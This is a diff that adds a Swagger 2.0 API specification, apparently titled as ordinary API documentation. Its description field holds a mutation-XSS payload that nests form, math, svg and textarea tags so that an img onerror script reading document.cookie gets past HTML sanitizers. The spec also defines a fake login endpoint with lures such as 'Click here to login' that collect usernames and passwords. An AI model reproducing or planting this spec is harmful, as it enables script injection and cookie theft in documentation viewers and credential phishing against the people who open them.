@@ -1,0 +1,40 @@
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src>"></form>
+  version: production
+basePath: RelicHunt3r
+produces:
+- application/xml
+- application/json
+consumes:
+- application/xml
+- application/json
+security:
+- basicAuth: []
+paths:
+  /Login_Page_RelicHunt3r:
+    post:
+      summary: Login here to continue
+      description: Please provide your credentials to log in.
+      parameters:
+        - name: username
+          in: formData
+          description: The username for login
+          required: true
+          type: string
+        - name: password
+          in: formData
+          description: The password for login
+          required: true
+          type: string
+      tags:
+        - Click here to login
+      responses:
+        '200':
+          description: Successfully logged in and authenticated.
+        '400':
+          description: Invalid credentials or missing parameters.
+        '500':
+          description: Internal server error.
